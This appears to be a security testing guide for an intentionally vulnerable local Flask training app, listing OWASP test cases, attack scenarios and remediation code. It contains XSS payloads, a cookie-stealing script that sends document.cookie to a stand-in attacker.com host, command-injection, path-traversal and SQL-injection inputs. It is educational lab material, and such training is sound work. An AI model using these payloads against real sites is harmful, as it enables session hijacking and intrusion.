@@ -1,0 +1,767 @@
+===============================================================================
+SECURITY TESTING LAB - TESTING GUIDE
+Vulnerability Identification and Risk Assessment
+===============================================================================
+
+OVERVIEW
+========
+This document provides comprehensive testing scenarios for the intentionally
+vulnerable Security Testing Lab application. Each test case is designed to
+demonstrate specific OWASP vulnerabilities.
+
+Prerequisites:
+- Application running at http://127.0.0.1:5000
+- Modern web browser with developer tools
+- Basic understanding of web security concepts
+
+AVAILABLE TEST ACCOUNTS
+=======================
+Account 1:
+  Username: admin
+  Password: admin123
+
+Account 2:
+  Username: user
+  Password: password
+
+
+============================================================================
+SECTION 1: AUTHENTICATION TESTING
+============================================================================
+
+TEST CASE 1.1: Valid Login with Admin Account
+----------------------------------------------
+Objective: Test successful authentication with valid credentials
+
+Steps:
+1. Navigate to http://127.0.0.1:5000/login
+2. Enter Username: admin
+3. Enter Password: admin123
+4. Click "Login" button
+
+Expected Result:
+✓ Successfully redirected to /dashboard
+✓ Welcome message shows "You are logged in as: admin"
+✓ Dashboard displays all navigation links
+
+Vulnerability Demonstrated: None (correct behavior)
+
+
+TEST CASE 1.2: Valid Login with User Account
+----------------------------------------------
+Objective: Test successful authentication with user account
+
+Steps:
+1. Navigate to http://127.0.0.1:5000/login
+2. Enter Username: user
+3. Enter Password: password
+4. Click "Login" button
+
+Expected Result:
+✓ Successfully redirected to /dashboard
+✓ Welcome message shows "You are logged in as: user"
+
+Vulnerability Demonstrated: None (correct behavior)
+
+
+TEST CASE 1.3: Invalid Password
+--------------------------------
+Objective: Test weak error messages (Information Disclosure)
+
+Steps:
+1. Navigate to http://127.0.0.1:5000/login
+2. Enter Username: admin
+3. Enter Password: wrongpassword
+4. Click "Login" button
+
+Expected Result:
+✗ Error message: "Invalid username or password"
+✓ Redirect back to login page
+
+Vulnerability Demonstrated:
+- Generic error message (actually not vulnerable)
+- But the code comment shows this SHOULD be vulnerable (specific error messages)
+
+
+TEST CASE 1.4: Invalid Username
+--------------------------------
+Objective: Test password brute force potential
+
+Steps:
+1. Navigate to http://127.0.0.1:5000/login
+2. Try logging in multiple times with different usernames
+3. Attempt: nonexistent / password
+4. Attempt: guest / password
+5. Attempt: admin / wrong
+6. Attempt: user / wrong
+
+Expected Result:
+✗ Login fails for each attempt
+✗ No account lockout after multiple failures
+✗ No delay between attempts
+
+Vulnerability Demonstrated:
+- NO ACCOUNT LOCKOUT (CRITICAL)
+- Attacker can perform unlimited brute force attacks
+- No rate limiting
+- OWASP A07:2021 - Identification and Authentication Failures
+
+
+TEST CASE 1.5: Empty Credentials
+---------------------------------
+Objective: Test input validation
+
+Steps:
+1. Navigate to http://127.0.0.1:5000/login
+2. Leave Username field empty
+3. Enter any password
+4. Click "Login" button
+
+Expected Result:
+✗ Error message: "Username and password are required"
+
+Repeat with empty password field.
+
+Expected Result:
+✗ Error message: "Username and password are required"
+
+Vulnerability Demonstrated: Proper input validation (not vulnerable)
+
+
+TEST CASE 1.6: Special Characters in Login
+--------------------------------------------
+Objective: Test input validation with special characters
+
+Steps:
+1. Navigate to http://127.0.0.1:5000/login
+2. Enter Username: '; DROP TABLE users;--
+3. Enter Password: '; DROP TABLE users;--
+4. Click "Login" button
+
+Expected Result:
+✗ Login fails (no SQL injection possible, using dictionary not SQL)
+
+Note: This application doesn't use SQL, so SQL injection isn't possible.
+However, it demonstrates the importance of input validation.
+
+Vulnerability Demonstrated: Application is immune to this attack due to design
+
+
+============================================================================
+SECTION 2: WEAK AUTHENTICATION TESTING
+============================================================================
+
+TEST CASE 2.1: Plaintext Password Storage
+------------------------------------------
+Objective: Demonstrate plaintext password storage vulnerability
+
+Steps:
+1. Open app.py in a text editor
+2. Search for the USERS dictionary
+3. Observe passwords stored in plaintext
+
+Example:
+    USERS = {
+        'admin': 'admin123',    <-- PLAINTEXT PASSWORD
+        'user': 'password'      <-- PLAINTEXT PASSWORD
+    }
+
+Expected Result:
+✓ Both passwords are visible in plaintext
+
+Vulnerability Demonstrated:
+- OWASP A02:2021 - Cryptographic Failures
+- Passwords are not hashed or salted
+- If database is compromised, all passwords are exposed
+- Industry standard: Use bcrypt, argon2, or scrypt for password hashing
+
+
+TEST CASE 2.2: Weak Secret Key
+-------------------------------
+Objective: Demonstrate weak session secret key
+
+Steps:
+1. Open app.py in a text editor
+2. Search for app.secret_key
+3. Observe weak key value
+
+Example:
+    app.secret_key = 'weak_secret_key_for_lab'
+
+Expected Result:
+✓ Secret key is a simple string, easy to guess
+
+Vulnerability Demonstrated:
+- OWASP A05:2021 - Security Misconfiguration
+- Session tokens can be forged
+- Attacker can create valid session tokens without authentication
+- Industry standard: Use cryptographically secure random keys
+
+
+TEST CASE 2.3: Session Cookie Inspection
+-----------------------------------------
+Objective: Examine session token structure
+
+Steps:
+1. Login with valid credentials (admin / admin123)
+2. Open browser Developer Tools (F12 or Right-click → Inspect)
+3. Go to "Application" or "Storage" tab
+4. Look for "Cookies" section
+5. Find cookie named "session"
+6. Observe the cookie value
+
+Expected Result:
+✓ Session cookie is visible and readable
+✓ Cookie value is a JWT or similar token
+✓ Cookie doesn't have HttpOnly flag (in development mode)
+
+Vulnerability Demonstrated:
+- Session tokens are accessible to JavaScript
+- Vulnerable to XSS attacks
+- Industry standard: Use HttpOnly and Secure flags on cookies
+
+
+============================================================================
+SECTION 3: BROKEN ACCESS CONTROL TESTING
+============================================================================
+
+TEST CASE 3.1: Direct Dashboard Access Without Login
+-----------------------------------------------------
+Objective: Test login requirement enforcement
+
+Steps:
+1. Open new browser tab or window
+2. Try to navigate directly to: http://127.0.0.1:5000/dashboard
+3. Without logging in first
+
+Expected Result:
+✓ Redirected to /login page
+✓ Cannot access dashboard without session
+
+Vulnerability Demonstrated: None (correct behavior)
+
+
+TEST CASE 3.2: Direct Search Access Without Login
+--------------------------------------------------
+Objective: Test protected routes
+
+Steps:
+1. Open new browser tab (fresh session)
+2. Navigate to: http://127.0.0.1:5000/search
+3. Without logging in first
+
+Expected Result:
+✓ Redirected to /login page
+
+Vulnerability Demonstrated: None (correct behavior)
+
+
+TEST CASE 3.3: View Other Users' Profiles (Broken Access Control)
+------------------------------------------------------------------
+Objective: Demonstrate unauthorized profile access (CRITICAL VULNERABILITY)
+
+Steps:
+1. Login as 'user' account (username: user, password: password)
+2. Navigate to: http://127.0.0.1:5000/profile?id=1
+
+Expected Result:
+✗ Can view ADMIN profile as regular user
+✓ See admin's email, username, and role
+✗ NO authorization check performed
+
+Repeat with:
+3. Navigate to: http://127.0.0.1:5000/profile?id=2
+   Result: Can view user profile (own profile)
+
+4. Navigate to: http://127.0.0.1:5000/profile?id=3
+   Result: Can view guest profile
+
+Vulnerability Demonstrated:
+- OWASP A01:2021 - Broken Access Control (MOST CRITICAL)
+- No authorization checks on profile page
+- Any logged-in user can view any user's profile
+- User ID is sequential and predictable
+- Attacker can enumerate all users by trying different IDs
+
+
+TEST CASE 3.4: Parameter Manipulation - Invalid IDs
+-----------------------------------------------------
+Objective: Test error handling with invalid parameters
+
+Steps:
+1. Login with valid credentials
+2. Navigate to: http://127.0.0.1:5000/profile?id=999
+3. Try: /profile?id=-1
+4. Try: /profile?id=0
+5. Try: /profile?id=abc (non-integer)
+
+Expected Result:
+✓ User not found message displayed
+✓ Appropriate error handling
+✓ Application doesn't crash
+
+Vulnerability Demonstrated: Good error handling (not vulnerable here)
+
+
+============================================================================
+SECTION 4: INJECTION VULNERABILITIES - XSS TESTING
+============================================================================
+
+TEST CASE 4.1: Simple Script Injection in Search
+-------------------------------------------------
+Objective: Demonstrate Reflected XSS vulnerability
+
+Steps:
+1. Login with valid credentials (admin / admin123)
+2. Navigate to: http://127.0.0.1:5000/search
+3. In the search box, enter: <script>alert('XSS')</script>
+4. Click "Search" button
+
+Expected Result:
+✗ JavaScript alert box appears with message 'XSS'
+✗ Input is not sanitized or escaped
+✗ Script executes in browser context
+
+Vulnerability Demonstrated:
+- OWASP A03:2021 - Injection (XSS)
+- Reflected XSS - user input directly reflected in response
+- No HTML escaping or sanitization
+- Attacker can inject malicious scripts
+- Scripts run with user's privileges
+
+
+TEST CASE 4.2: Image Tag XSS
+-----------------------------
+Objective: Demonstrate XSS via img tag
+
+Steps:
+1. Navigate to: http://127.0.0.1:5000/search
+2. Enter: <img src=x onerror=alert('XSS via img')>
+3. Click "Search" button
+
+Expected Result:
+✗ Alert box appears: 'XSS via img'
+✗ Browser tries to load image 'x' which fails
+✗ onerror event handler executes
+
+Vulnerability Demonstrated: XSS vulnerability
+
+
+TEST CASE 4.3: SVG XSS
+----------------------
+Objective: Demonstrate XSS via SVG
+
+Steps:
+1. Navigate to: http://127.0.0.1:5000/search
+2. Enter: <svg onload=alert('XSS via SVG')>
+3. Click "Search" button
+
+Expected Result:
+✗ Alert box appears: 'XSS via SVG'
+
+Vulnerability Demonstrated: XSS vulnerability
+
+
+TEST CASE 4.4: Cookie Stealing Simulation
+-------------------------------------------
+Objective: Demonstrate data theft potential
+
+Steps:
+1. Navigate to: http://127.0.0.1:5000/search
+2. Enter: <script>alert('Your session: ' + document.cookie)</script>
+3. Click "Search" button
+
+Expected Result:
+✗ Alert box shows session cookie value
+✗ Attacker could exfiltrate this data to their server
+
+Real Attack Scenario:
+    <script>
+    new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
+    </script>
+
+Vulnerability Demonstrated:
+- Session hijacking is possible
+- Attacker can steal session tokens
+- Can impersonate the user
+
+
+TEST CASE 4.5: Stored Data via Query Parameters
+-------------------------------------------------
+Objective: Demonstrate XSS via URL sharing
+
+Steps:
+1. Click on search, then manually modify URL:
+2. Navigate to this exact URL:
+   http://127.0.0.1:5000/search?q=<script>alert('Shared%20XSS')</script>
+3. Copy this URL and share with someone
+4. When they visit, alert executes in their browser
+
+Expected Result:
+✗ Stored XSS if URL is shared
+✗ Anyone clicking link sees the alert
+
+Vulnerability Demonstrated:
+- Reflected XSS via URL
+- Can be used for phishing
+- Can be embedded in emails or social media
+
+
+============================================================================
+SECTION 5: INPUT VALIDATION TESTING
+============================================================================
+
+TEST CASE 5.1: SQL Injection-like Input (Theoretical)
+------------------------------------------------------
+Objective: Test input validation with SQL-like syntax
+
+Steps:
+1. Navigate to: http://127.0.0.1:5000/search
+2. Enter: ' OR 1=1 --
+3. Click "Search" button
+
+Expected Result:
+✓ Text is reflected without execution
+✓ No database query is affected (application doesn't use SQL for search)
+
+Note: This application is immune to SQL injection due to its design,
+but it demonstrates the input validation testing approach.
+
+Vulnerability Demonstrated:
+- Application design prevents SQL injection (not intentionally vulnerable)
+
+
+TEST CASE 5.2: Path Traversal Attempt
+--------------------------------------
+Objective: Test path traversal protections
+
+Steps:
+1. Try to access: http://127.0.0.1:5000/search?q=../../../etc/passwd
+2. Try to access: http://127.0.0.1:5000/profile?id=../../../
+
+Expected Result:
+✓ No file access or errors
+✓ Application properly handles unusual input
+
+Vulnerability Demonstrated: None (application is resistant)
+
+
+TEST CASE 5.3: Command Injection-like Input
+---------------------------------------------
+Objective: Test command injection resistance
+
+Steps:
+1. Navigate to: http://127.0.0.1:5000/search
+2. Enter: ; whoami ;
+3. Enter: | dir
+4. Enter: && echo test
+
+Expected Result:
+✓ Commands are not executed
+✓ Input is treated as literal text
+
+Vulnerability Demonstrated: None (application is resistant)
+
+
+============================================================================
+SECTION 6: SESSION MANAGEMENT TESTING
+============================================================================
+
+TEST CASE 6.1: Session Timeout
+------------------------------
+Objective: Test session persistence
+
+Steps:
+1. Login successfully
+2. Note the time
+3. Wait for 30 minutes without interacting with the application
+4. Try to access /dashboard
+
+Expected Result:
+- Session may or may not timeout (depends on Flask configuration)
+- No timeout set in this lab application
+
+Vulnerability Demonstrated:
+- Infinite session lifetime (VULNERABILITY)
+- Session never expires automatically
+- Stolen session tokens remain valid indefinitely
+
+
+TEST CASE 6.2: Session Fixation
+---------------------------------
+Objective: Demonstrate session fixation potential
+
+Steps:
+1. Open Developer Tools (F12)
+2. Go to Application → Cookies
+3. Before login, create a custom session cookie
+4. Notice you can set arbitrary session values
+5. Try to forge a session
+
+Expected Result:
+✗ Weak secret key allows session tampering
+✗ Can potentially forge valid sessions
+
+Vulnerability Demonstrated:
+- Session secret key is weak
+- Sessions can be forged
+- OWASP A05:2021 - Security Misconfiguration
+
+
+TEST CASE 6.3: Session Persistence After Logout
+-------------------------------------------------
+Objective: Test logout effectiveness
+
+Steps:
+1. Login with admin account
+2. Click "Logout" button
+3. Try to navigate directly to: http://127.0.0.1:5000/dashboard
+
+Expected Result:
+✓ Redirected to login page
+✓ Session properly cleared
+
+Vulnerability Demonstrated: None (correct behavior)
+
+
+============================================================================
+SECTION 7: ERROR HANDLING TESTING
+============================================================================
+
+TEST CASE 7.1: 404 Error Page
+------------------------------
+Objective: Test error page security
+
+Steps:
+1. Navigate to: http://127.0.0.1:5000/nonexistent
+2. Observe error page
+
+Expected Result:
+✓ Custom 404 page displays
+✓ No stack traces or sensitive information
+✓ Helpful error message
+
+Vulnerability Demonstrated: None (proper error handling)
+
+
+TEST CASE 7.2: 500 Error Handling
+----------------------------------
+Objective: Test server error handling
+
+Note: This application handles errors well, so it's difficult to trigger 500 errors
+through normal usage.
+
+Expected Behavior:
+✓ Should display generic error page if server error occurs
+✓ Should not expose stack traces in production
+
+
+============================================================================
+SECTION 8: OWASP TOP 10 VULNERABILITY SUMMARY
+============================================================================
+
+Vulnerabilities PRESENT in this application:
+
+1. ✗ A01:2021 - Broken Access Control
+   Location: /profile route
+   Issue: No authorization checks, any user can view any profile
+   Severity: CRITICAL
+   
+2. ✗ A02:2021 - Cryptographic Failures
+   Location: app.py USERS dictionary
+   Issue: Passwords stored in plaintext, no hashing
+   Severity: CRITICAL
+   
+3. ✗ A03:2021 - Injection
+   Location: /search route
+   Issue: Reflected XSS vulnerability, no input sanitization
+   Severity: HIGH
+   
+4. ✗ A05:2021 - Security Misconfiguration
+   Location: app.secret_key
+   Issue: Weak session secret key
+   Severity: HIGH
+   
+5. ✗ A07:2021 - Identification and Authentication Failures
+   Location: /login route
+   Issue: No account lockout, weak credentials, no MFA
+   Severity: HIGH
+
+
+Vulnerabilities ABSENT (intentionally designed securely):
+
+✓ A04:2021 - Insecure Design
+✓ A06:2021 - Vulnerable and Outdated Components
+✓ A08:2021 - Software and Data Integrity Failures
+✓ A09:2021 - Logging and Monitoring Failures
+✓ A10:2021 - Server-Side Request Forgery
+
+
+============================================================================
+PRACTICAL ATTACK SCENARIOS
+============================================================================
+
+SCENARIO 1: Account Enumeration
+================================
+Objective: Discover all user IDs
+
+Steps:
+1. Login as any user
+2. Visit /profile?id=1, /profile?id=2, /profile?id=3, etc.
+3. Document which IDs return valid users
+
+Result: Can enumerate all system users
+
+
+SCENARIO 2: Session Hijacking
+==============================
+Objective: Steal another user's session
+
+Steps:
+1. Use Browser DevTools to capture your own session cookie
+2. Note the session cookie value
+3. Attempt to forge a similar cookie for different user
+4. OR use cookie during vulnerable XSS to steal another user's session
+
+Result: Can potentially hijack user sessions
+
+
+SCENARIO 3: XSS Attack Chain
+=============================
+Objective: Perform combined XSS attack
+
+Steps:
+1. Create malicious search URL:
+   http://127.0.0.1:5000/search?q=<script>
+   var img=new Image();
+   img.src='http://attacker.com/log.php?user='+document.cookie;
+   </script>
+2. Send URL to victim
+3. When victim clicks, session is stolen
+
+Result: Session hijacking through XSS
+
+
+============================================================================
+REMEDIATION RECOMMENDATIONS
+============================================================================
+
+Fix #1: Implement Password Hashing
+-----------------------------------
+USE: bcrypt, argon2, or scrypt
+BEFORE: USERS = {'admin': 'admin123'}
+AFTER:  USERS = {'admin': bcrypt.hashpw(b'admin123', salt)}
+
+Code Example:
+    import bcrypt
+    hashed = bcrypt.hashpw(b'password', bcrypt.gensalt())
+    if bcrypt.checkpw(b'password', hashed):
+        # Password matches
+
+
+Fix #2: Implement Strong Secret Key
+------------------------------------
+BEFORE: app.secret_key = 'weak_secret_key_for_lab'
+AFTER:  app.secret_key = secrets.token_hex(32)
+
+Code Example:
+    import secrets
+    app.secret_key = secrets.token_hex(32)
+
+
+Fix #3: Add HTML Escaping
+--------------------------
+BEFORE: {{ result | safe }}
+AFTER:  {{ result | escape }}
+
+Code Example:
+    from markupsafe import escape
+    result = escape(user_input)
+
+
+Fix #4: Implement Authorization Checks
+---------------------------------------
+BEFORE: 
+    if user_id in USER_DATA:
+        return render_user(user_id)
+
+AFTER:
+    current_user_id = get_user_id_from_session()
+    if user_id != current_user_id:
+        return "Unauthorized", 403
+    if user_id in USER_DATA:
+        return render_user(user_id)
+
+
+Fix #5: Implement Account Lockout
+----------------------------------
+Add lockout after N failed attempts:
+    failed_attempts[username] += 1
+    if failed_attempts[username] > 5:
+        # Lockout user for 15 minutes
+
+
+Fix #6: Implement Input Validation
+-----------------------------------
+Use Flask-WTF for CSRF and input validation:
+    from flask_wtf.csrf import CSRFProtect
+    csrf = CSRFProtect(app)
+
+
+============================================================================
+TESTING TOOLS
+============================================================================
+
+Browser Developer Tools:
+- F12 or Right-click → Inspect Elements
+- Check network requests, cookies, console for errors
+
+Recommended Tools for Advanced Testing:
+- Burp Suite Community (Security testing proxy)
+- OWASP ZAP (Automated vulnerability scanner)
+- Postman (API testing)
+- Curl (Command-line HTTP client)
+
+Example Burp Suite Test:
+1. Open Burp Suite
+2. Configure browser to use Burp as proxy
+3. Navigate application and capture requests
+4. Test for vulnerabilities in each request
+
+
+============================================================================
+CONCLUSION
+============================================================================
+
+This intentionally vulnerable application successfully demonstrates:
+
+1. How common security vulnerabilities appear in code
+2. The impact of each OWASP Top 10 vulnerability
+3. How to identify and test for security issues
+4. The importance of secure coding practices
+
+Use this application ONLY for:
+- Educational training
+- Security awareness
+- Penetration testing practice
+- Vulnerability assessment training
+
+DO NOT use for:
+- Production systems
+- Real applications
+- Storing sensitive data
+- Internet deployment
+
+
+For further learning:
+- Visit OWASP.org
+- Review security best practices
+- Study cryptography and authentication
+- Practice on legitimate vulnerable applications like DVWA or WebGoat
+
+
+===============================================================================
+Last Updated: May 2026
+Version: 1.0
+Educational Purpose Only
+===============================================================================
